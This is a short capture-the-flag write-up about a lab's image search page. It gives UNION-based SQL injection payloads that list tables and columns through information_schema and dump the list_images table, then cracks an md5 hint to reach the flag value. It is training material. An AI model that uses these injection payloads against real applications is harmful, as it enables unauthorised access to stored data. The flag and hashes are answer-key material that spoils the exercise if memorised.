# 02_sql_injection_images

Able to inject sql statements on image search

## Method

Go to the Image Search Page
Homepage > Search Image

Type `-1 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = database ()` in the input field to get the table name.

Then type `-1 UNION SELECT NULL, column_name from information_schema.columns where table_schema = database ()` to find the column names

The column names are: id, url, title, comment.

Type `-1 UNION SELECT NULL, CONCAT (id, url, title, comment) FROM list_images` to see all of the fields.

One of the images has `If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`.

Using https://www.md5online.org/md5-decrypt.html to decrypt `1928e8083cf461a51303633093573c46` gives you `albatroz`.

Then using https://emn178.github.io/online-tools/sha256.html to encrypt `albatroz` gives you the flag `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`.

## Explanation

With SQL injections you can browse through all of the information stored on the database and access information not intended to be shared.
